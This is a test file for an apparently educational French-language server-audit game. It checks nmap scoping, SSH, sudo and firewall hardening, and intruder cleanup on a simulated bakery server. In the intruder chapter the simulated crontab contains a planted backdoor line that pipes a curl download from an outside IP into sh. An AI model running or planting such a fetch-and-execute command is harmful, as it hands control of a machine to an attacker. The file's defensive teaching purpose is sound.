// L'Audit : le serveur du Fournil (le périmètre, le rapport, l'exposition, les
// traces, la contre-visite).
// Rejoué avec la console, dans chaque langue.

import { describe, expect, it } from 'vitest';
import { Console } from '../src/engine/console';
import { STORIES } from '../src/engine/chapters';
import { prerequisites } from '../src/engine/unlocking';
import { LANGUAGES, translator } from '../src/texts';
import { inLanguage, machinesInLanguage } from './names';

// L'Effaceur, puis les chapitres à finir pour recevoir la clé de l'histoire.
const ERASER = [...new Set([...STORIES.find((h) => h.id === 'eraser')!.chapters.map((c) => c.id), ...prerequisites('audit')])];
const MDP = 'farine-2028';

for (const language of LANGUAGES)
  describe(`L'Audit — ${language}`, () => {
    const fr = language === 'fr';
    const L = (line: string) => inLanguage(translator(language), line);
    const contains = (all: string, text: string) => fr && expect(all).toContain(text);
    const part = (finished: string[] = []) => {
      const c = new Console({ language, finished: [...ERASER, ...finished] });
      const one = (l: string) => {
        let output = c.execute(L(l)) ?? '';
        if (c.shell.waiting) output += '\n' + (c.execute(machinesInLanguage(c.t, MDP)) ?? '');
        return output;
      };
      const play = (lines: string[]) => lines.map(one).join('\n');
      const edit = (command: string, change: (text: string) => string) => {
        one(command);
        c.save(change(c.edition!.text));
        return c.quitEdition();
      };
      play(['ssh bakery', 'yes']);
      return { c, jouer: play, editer: edit };
    };

    it('Salomé ne relit qu’après un enregistrement, pas à la première commande ; nmap -h donne l’aide', () => {
      const t = translator(language);
      const { jouer: play } = part();
      const all = play(['ls', 'nmap -h']);
      expect(all).not.toContain(t('scope-relecture'));
      expect(all).not.toContain('invalid option');
      contains(all, 'Utilisation : nmap');
      // Une adresse hors de la lettre, mais pas celle du voisin : le message dit laquelle, sans parler du voisin.
      const elsewhere = part().jouer(['nmap 203.0.113.5']);
      expect(elsewhere).toContain('203.0.113.5');
      contains(elsewhere, 'pas dans ta lettre');
      if (fr) expect(elsewhere).not.toContain('voisin');
      const against = part(['scope', 'report', 'exposure', 'traces']);
      expect(against.jouer(['ls'])).not.toContain(t('follow-up-relecture'));
    });

    it('chapitre 2 — solution : root fermé, Lucas supprimé, sudo avec mot de passe, secret en 600', () => {
      const { c, jouer: play, editer: edit } = part(['scope']);
      let all = play(['cat rapport-audit.txt', 'sudo -l', 'ls -l /srv/commandes']);
      contains(all, 'RAPPORT D\'AUDIT');
      expect(all).toContain('NOPASSWD');
      // Au début, aucun constat n'est traité.
      for (const id of ['ssh', 'compte', 'sudo', 'secret']) expect(c.shell.flags.has(id), id).toBe(false);
      edit('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      play(['sudo sshd -t', 'sudo systemctl reload ssh']);
      expect(c.finished).not.toContain('report');
      play(['sudo userdel lucas', 'sudo rm /etc/sudoers.d/90-cloud-init-users', 'sudo chmod 600 /srv/commandes/.env']);
      all = play(['sudo -l']);
      expect(all).not.toContain('NOPASSWD');
      expect(c.finished).toContain('report');
    });

    it('chapitre 2 — une autre solution : verrouiller et expirer Lucas, visudo, chmod 640', () => {
      const { c, jouer: play, editer: edit } = part(['scope']);
      edit('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      play(['sudo systemctl reload ssh', 'sudo usermod -L -e 1 lucas', 'sudo gpasswd -d lucas sudo']);
      edit('sudo nano /etc/sudoers.d/90-cloud-init-users', () => 'vous ALL=(ALL) ALL');
      play(['sudo chmod 640 /srv/commandes/.env']);
      expect(c.finished).toContain('report');
    });

    it('chapitre 2 — fausses pistes : fichier modifié sans recharger, compte à moitié fermé, secret fermé à l’appli', () => {
      const { c, jouer: play, editer: edit } = part(['scope']);
      const e = (id: string) => c.shell.flags.has(id);
      edit('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      expect(e('sans-effet')).toBe(true);
      play(['sudo usermod -L lucas']);
      expect(e('compte-incomplet')).toBe(true);
      play(['sudo chown root:root /srv/commandes/.env', 'sudo chmod 600 /srv/commandes/.env']);
      expect(e('appli-aveugle')).toBe(true);
      expect(c.finished).not.toContain('report');
    });

    
    const REDIS = '/etc/redis/redis.conf';
    const redisLocal = (t: string) => t.replace('bind * -::*', 'bind 127.0.0.1 -::1');

    it('chapitre 3 — solution : ss, ufw (SSH et le site d’abord), Redis en local, reconnexion', () => {
      const { c, jouer: play, editer: edit } = part(['scope', 'report']);
      let all = play(['cat balayage-audit.txt', 'sudo ss -tlnp']);
      expect(all).toContain('0.0.0.0:6379');
      expect(all).toContain('127.0.0.1:3000');
      play(['sudo ufw allow OpenSSH', 'sudo ufw allow "Nginx Full"', 'sudo ufw enable', 'y']);
      expect(c.finished).not.toContain('exposure');
      edit(`sudo nano ${REDIS}`, redisLocal);
      play(['sudo systemctl restart redis-server']);
      all = play(['sudo ss -tln', 'sudo ufw status verbose']);
      expect(all).toContain('127.0.0.1:6379');
      expect(c.finished).not.toContain('exposure');
      play(['exit', 'ssh bakery']);
      expect(c.finished).toContain('exposure');
    });

    it('chapitre 3 — une autre solution : règles par numéro de port, SSH depuis le poste seulement', () => {
      const { c, jouer: play, editer: edit } = part(['scope', 'report']);
      edit(`sudo nano ${REDIS}`, (t) => t.replace('bind * -::*', 'bind 127.0.0.1'));
      play([
        'sudo systemctl restart redis-server',
        'sudo ufw default deny incoming',
        'sudo ufw allow from 192.0.2.2 to any port 22 proto tcp',
        'sudo ufw allow 80/tcp',
        'sudo ufw allow 443/tcp',
        'sudo ufw enable',
        'y',
        'exit',
        'ssh bakery',
      ]);
      expect(c.finished).toContain('exposure');
    });

    it('chapitre 3 — fausses pistes : activer sans SSH, couper le site, tout autoriser, arrêter Redis, oublier le redémarrage', () => {
      const { c, jouer: play, editer: edit } = part(['scope', 'report']);
      const e = (id: string) => c.shell.flags.has(id);
      play(['sudo ufw allow 80/tcp', 'sudo ufw allow 443/tcp', 'sudo ufw enable', 'y']);
      expect(e('enferme')).toBe(true);
      play(['sudo ufw disable', 'sudo ufw delete allow 80/tcp', 'sudo ufw allow OpenSSH', 'sudo ufw enable', 'y']);
      expect(e('site-coupe')).toBe(true);
      play(['sudo ufw allow 80/tcp', 'sudo ufw allow 443/tcp', 'sudo ufw allow 6379/tcp']);
      expect(e('base-ouverte')).toBe(true);
      play(['sudo systemctl stop redis-server']);
      expect(e('redis-arrete')).toBe(true);
      play(['sudo systemctl start redis-server']);
      edit(`sudo nano ${REDIS}`, redisLocal);
      expect(e('sans-effet')).toBe(true);
      expect(c.finished).not.toContain('exposure');
    });

    
    const KEYS = '/home/nadia/.ssh/authorized_keys';
    const ENV = '/srv/commandes/.env';
    const NEW = 'baguette-tradition-2028-champagne';
    const withoutIntruder = (t: string) => t.split('\n').filter((l) => !l.includes('nadia@portable')).join('\n');
    const withoutTag = (t: string) => t.split('\n').filter((l) => !l.includes('203.0.113.99')).join('\n');

    it('chapitre 4 — solution : journal, last, empreinte, clé retirée, crontab nettoyée', () => {
      const { c, jouer: play, editer: edit } = part(['scope', 'report', 'exposure']);
      let all = play(['last nadia', 'journalctl -u ssh | grep Accepted']);
      expect(all).toContain('203.0.113.99');
      expect(all).toContain('Accepted publickey for nadia from 203.0.113.99 port 52144 ssh2: ED25519 SHA256:');
      all = play([`sudo ssh-keygen -l -f ${KEYS}`]);
      expect(all).toContain('nadia@boutique (ED25519)');
      expect(all).toContain('nadia@portable (ED25519)');
      edit(`sudo nano ${KEYS}`, withoutIntruder);
      expect(c.finished).not.toContain('traces');
      all = play(['sudo crontab -u nadia -l']);
      expect(all).toContain('curl -fsS http://203.0.113.99/b | sh');
      edit('sudo crontab -u nadia -e', withoutTag);
      all = play(['sudo crontab -u nadia -l']);
      expect(all).toContain('sauvegarde.sh');
      expect(all).not.toContain('203.0.113.99');
      // L'intrus a lu le secret : le mot de passe se change des deux côtés, puis l'appli est relancée.
      expect(c.finished).not.toContain('traces');
      expect(play(['sudo cat /home/nadia/.bash_history'])).toContain('cat /srv/commandes/.env');
      expect(play([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NEW}'"`])).toContain('ALTER ROLE');
      edit(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NEW));
      expect(c.finished).not.toContain('traces');
      play(['sudo systemctl restart commandes']);
      expect(play(['systemctl is-active commandes'])).toContain('active');
      expect(c.finished).toContain('traces');
    });

    it('chapitre 4 — le mot de passe : trop court, un seul côté, oublier de relancer', () => {
      const { c, jouer: play, editer: edit } = part(['scope', 'report', 'exposure']);
      const e = (id: string) => c.shell.flags.has(id);
      edit(`sudo nano ${KEYS}`, withoutIntruder);
      edit('sudo crontab -u nadia -e', withoutTag);
      expect(play(['psql -c "ALTER ROLE commandes PASSWORD \'x\'"'])).toContain('does not exist');
      play([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD 'court'"`]);
      expect(e('mot-de-passe-faible')).toBe(true);
      // Un seul côté : la base a changé, pas .env — l'appli ne repart plus.
      play([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NEW}'"`, 'sudo systemctl restart commandes']);
      expect(e('appli-tombee')).toBe(true);
      expect(play(['sudo journalctl -u commandes -n 5'])).toContain('password authentication failed');
      // Les deux côtés d'accord, mais pas relancée : elle garde l'ancien mot de passe en mémoire.
      edit(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NEW));
      play(['sudo systemctl restart commandes']);
      expect(c.finished).toContain('traces');
      // Le même cas sans redémarrage : « à redémarrer ».
      const b = part(['scope', 'report', 'exposure']);
      b.editer(`sudo nano ${KEYS}`, withoutIntruder);
      b.editer('sudo crontab -u nadia -e', withoutTag);
      b.jouer([`sudo -u postgres psql -c "ALTER ROLE commandes PASSWORD '${NEW}'"`]);
      b.editer(`sudo nano ${ENV}`, (t) => t.replace('brioche-beurre-91', NEW));
      expect(b.c.shell.flags.has('a-redemarrer')).toBe(true);
      expect(b.c.finished).not.toContain('traces');
    });

    it('chapitre 4 — fausses pistes : tout effacer (Nadia dehors, sauvegarde perdue)', () => {
      const { c, jouer: play, editer: edit } = part(['scope', 'report', 'exposure']);
      const e = (id: string) => c.shell.flags.has(id);
      edit(`sudo nano ${KEYS}`, () => '');
      expect(e('nadia-enfermee')).toBe(true);
      edit(`sudo nano ${KEYS}`, (t) => t + '\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA x@y');
      play(['sudo crontab -u nadia -r']);
      expect(e('sauvegarde-perdue')).toBe(true);
      expect(c.finished).not.toContain('traces');
    });

    // ——— Le chapitre 1, « Le périmètre » ———
    const NOTES = (outside: string) => `# ${fr ? 'Notes' : 'Notes'}
## ${fr ? 'Périmètre' : 'Scope'}
${fr ? 'Seulement le serveur fournil (192.0.2.22), comme la lettre de mission.' : 'Only the fournil server (192.0.2.22), as in the letter of engagement.'}
## ${fr ? "Ce que j'ai trouvé" : 'What I found'}
${fr ? 'Vus d’internet : SSH (22), le site (80, 443), mais aussi PostgreSQL (5432) et Redis (6379).' : 'Seen from the internet: SSH (22), the website (80, 443), but also PostgreSQL (5432) and Redis (6379).'}
## ${fr ? 'Hors périmètre' : 'Out of scope'}
${outside}`;
    const OUTSIDE = fr ? 'Le serveur du voisin (192.0.2.24) : hors périmètre, je ne l’ai pas sondé.' : 'The neighbour’s server (192.0.2.24): out of scope, I did not probe it.';

    it('chapitre 1 — solution : la lettre, nmap -sV -oN, des notes honnêtes', () => {
      const { c, jouer: play, editer: edit } = part();
      let all = play(['cat lettre-de-mission.txt']);
      contains(all, 'LETTRE DE MISSION');
      all = play(['nmap -sV -oN inventaire.txt bakery.internal']);
      expect(all).toContain(machinesInLanguage(translator(language), 'Nmap scan report for bakery.internal (192.0.2.22)'));
      expect(all).toContain('Not shown: 995 closed tcp ports (reset)');
      expect(all).toContain('5432/tcp open  postgresql PostgreSQL DB 17.0 - 17.2');
      expect(all).toContain('443/tcp  open  ssl/http   nginx 1.26.3');
      expect(all).toContain('Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel');
      expect(all).toContain('Nmap done: 1 IP address (1 host up) scanned in');
      all = play(['cat inventaire.txt']);
      expect(all).toMatch(new RegExp(`^# Nmap 7\\.95 scan initiated .* as: nmap -sV -oN \\S+ ${machinesInLanguage(translator(language), 'bakery.internal')}`, 'm'));
      expect(all).toMatch(/# Nmap done at .* -- 1 IP address \(1 host up\) scanned in/);
      expect(c.finished).not.toContain('scope');
      const review = edit('nano notes-audit.md', (t) => t.replace(/\(à compléter[^\n]*|\(to complete[^\n]*/, 'x'));
      contains(review, 'Salomé relit tes notes');
      edit('nano notes-audit.md', () => NOTES(OUTSIDE));
      expect(c.finished).toContain('scope');
      expect(c.shell.flags.has('hors-perimetre')).toBe(false);
    });

    it('chapitre 1 — fausse piste : balayer tout le réseau sonde le voisin (la faute, racontée dans le débrief)', () => {
      const { c, jouer: play, editer: edit } = part();
      const all = play(['nmap -sV -oN inventaire.txt 192.0.2.16/28']);
      expect(all).toContain('Nmap scan report for voisin.internal (192.0.2.24)');
      expect(all).toContain('3306/tcp open  mysql   MariaDB 10.11.6');
      expect(all).toContain('Nmap done: 16 IP addresses (2 hosts up) scanned in');
      expect(c.shell.flags.has('hors-perimetre')).toBe(true);
      expect(c.shell.flags.has('trace')).toBe(true);
      const end = edit('nano notes-audit.md', () => NOTES(OUTSIDE));
      contains(end, 'ton balayage a aussi sondé l\'adresse du voisin');
      expect(c.finished).toContain('scope');
    });

    it('chapitre 1 — notes incomplètes : les ports, le voisin, « hors périmètre »', () => {
      const { c, editer: edit } = part();
      const without = edit('nano notes-audit.md', () => NOTES(fr ? 'Rien.' : 'Nothing.'));
      contains(without, 'Il manque la machine que tu as repérée');
      const mi = edit('nano notes-audit.md', () => NOTES(fr ? 'Le serveur du voisin (192.0.2.24).' : 'The neighbour’s server (192.0.2.24).'));
      contains(mi, 'dis aussi que c\'est hors périmètre');
      expect(c.finished).not.toContain('scope');
    });

    it('nmap — messages : sans cible, option inconnue, machine muette, nom inconnu, -sn, -p', () => {
      const { jouer: play } = part();
      expect(play(['nmap'])).toContain('WARNING: No targets were specified, so 0 hosts scanned.');
      expect(play(['nmap -z bakery.internal'])).toContain("nmap: invalid option -- 'z'");
      expect(play(['nmap --frobnicate bakery.internal'])).toContain("nmap: unrecognized option '--frobnicate'");
      const muted = play(['nmap 192.0.2.99']);
      expect(muted).toContain('Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn');
      expect(muted).toContain('Nmap done: 1 IP address (0 hosts up) scanned in');
      expect(play(['nmap inconnue.internal'])).toContain('Failed to resolve "inconnue.internal".');
      expect(play(['nmap -sn bakery.internal'])).toContain('Host is up (0.011s latency).');
      const ports = play(['nmap -p 22,3306 bakery.internal']);
      expect(ports).toContain('22/tcp   open   ssh');
      expect(ports).toContain('3306/tcp closed mysql');
      expect(play(['nmap -sS bakery.internal'])).toContain('requires root privileges');
      expect(play(['sudo nmap -sS bakery.internal'])).toContain('22/tcp');
      expect(play(['nmap -V'])).toContain('Nmap version 7.95');
    });

    // ——— Le chapitre 5, « La contre-visite » ———
    const ALL = ['scope', 'report', 'exposure', 'traces'];
    const REPORT = (hint: string) => `# ${fr ? 'Rapport de clôture' : 'Closing report'}
## ${fr ? 'Résumé' : 'Summary'}
${fr ? 'Les quatre parties du rapport sont corrigées et vérifiées : le serveur est nettement mieux protégé.' : 'The four parts of the report are fixed and verified: the server is much better protected.'}
## ${fr ? 'Constats corrigés' : 'Findings fixed'}
${fr ? '- SSH : root ne peut plus entrer.\n- Le compte de Lucas est supprimé.\n- sudo demande un mot de passe.\n- Le fichier .env est fermé (secret).\n- ufw est actif et Redis écoute en local.\n- La clé de l’intrus et sa tâche cron sont retirées.' : '- SSH: root can no longer log in.\n- Lucas’s account is deleted.\n- sudo asks for a password.\n- The .env file is closed (secret).\n- ufw is active and Redis listens locally.\n- The intruder’s key and cron job are removed.'}
## ${fr ? 'Preuves' : 'Evidence'}
nmap -sV : ${fr ? 'seuls 22, 80 et 443 répondent.' : 'only 22, 80 and 443 answer.'} Lynis : ${fr ? 'indice de durcissement' : 'hardening index'} ${hint}.
## ${fr ? 'Reste à faire' : 'Still to do'}
${fr ? 'FINT-4350 : choisir et installer un outil d’intégrité des fichiers.' : 'FINT-4350: choose and install a file integrity tool.'}`;
    const harden = (edit: (c: string, f: (t: string) => string) => string) => {
      edit('sudo nano /etc/ssh/sshd_config', (t) => t.replace('X11Forwarding yes', 'X11Forwarding no') + '\nMaxAuthTries 3\nAllowTcpForwarding no\nAllowAgentForwarding no\n');
    };

    it('chapitre 5 — solution : nmap, lynis, mise à jour, durcissement, preuves, rapport', () => {
      const { c, jouer: play, editer: edit } = part(ALL);
      let all = play(['nmap -sV bakery.internal']);
      expect(all).toContain('Not shown: 997 filtered tcp ports (no-response)');
      expect(all).toContain('22/tcp  open  ssh      OpenSSH 10.0p1 Debian 7 (protocol 2.0)');
      expect(all).not.toContain('5432/tcp');
      all = play(['sudo lynis audit system']);
      expect(all).toContain('Hardening index : 60 [############        ]');
      expect(all).toContain('! Found one or more vulnerable packages. [PKGS-7392]');
      expect(all).toContain('  - Details  : X11Forwarding (set YES to NO)');
      expect(play(['sudo grep hardening_index /var/log/lynis-report.dat'])).toContain('hardening_index=60');
      play(['sudo apt upgrade -y']);
      harden(edit);
      play(['sudo sshd -t', 'sudo systemctl reload ssh']);
      all = play(['sudo lynis audit system']);
      expect(all).toContain('Hardening index : 80 [################    ]');
      expect(all).not.toContain('Warnings (');
      all = play(['nmap -sV bakery.internal']);
      expect(all).toContain('OpenSSH 10.0p1 Debian 7+deb13u1 (protocol 2.0)');
      expect(c.finished).not.toContain('follow-up');
      edit('nano rapport-cloture.md', () => REPORT('80'));
      expect(c.finished).toContain('follow-up');
    });

    it('chapitre 5 — une autre voie : l’avertissement et une seule suggestion suffisent (indice 71)', () => {
      const { c, jouer: play, editer: edit } = part(ALL);
      play(['sudo apt update', 'sudo apt upgrade -y']);
      edit('sudo nano /etc/login.defs', (t) => t.replace('UMASK           022', 'UMASK           027'));
      play(['sudo lynis audit system', 'nmap -sV bakery.internal']);
      expect(c.shell.state.lynis.hint).toBe(72);
      edit('nano rapport-cloture.md', () => REPORT('72'));
      expect(c.finished).toContain('follow-up');
    });

    it('chapitre 5 — fausses pistes : la configuration sans recharger, le rapport sans chiffre, un balayage hors périmètre', () => {
      const { c, jouer: play, editer: edit } = part(ALL);
      const e = (id: string) => c.shell.flags.has(id);
      play(['sudo apt upgrade -y']);
      expect(e('mise-a-jour')).toBe(true);
      harden(edit);
      expect(e('ssh-a-recharger')).toBe(true);
      expect(e('durci')).toBe(false);
      play(['sudo systemctl reload ssh']);
      expect(e('durci')).toBe(true);
      // Sans nouvel audit, Lynis n'a rien prouvé : l'ancien indice n'est plus celui de la machine.
      play(['sudo lynis audit system']);
      expect(e('preuve-lynis')).toBe(true);
      const without = edit('nano rapport-cloture.md', () => REPORT('12'));
      contains(without, 'cite l\'indice de durcissement de ton dernier audit Lynis');
      play(['nmap -sV 192.0.2.16/28']);
      expect(e('hors-perimetre')).toBe(true);
      expect(c.finished).not.toContain('follow-up');
    });

    it('lynis — messages : sans sudo, sans argument, la version ; le pare-feu change le balayage', () => {
      const { jouer: play } = part(ALL);
      contains(play(['lynis audit system']), 'Lynis a besoin de root');
      expect(play(['lynis show version'])).toBe('3.1.4');
      contains(play(['lynis']), 'Utilisation : lynis audit system');
      const ports = play(['nmap -p 22,5432,6379 bakery.internal']);
      expect(ports).toContain('5432/tcp filtered postgresql');
      expect(ports).toContain('6379/tcp filtered redis');
      const inside = play(['nmap -p 5432,6379 127.0.0.1']);
      expect(inside).toContain('5432/tcp open  postgresql');
      expect(inside).toContain('6379/tcp open  redis');
    });
  });
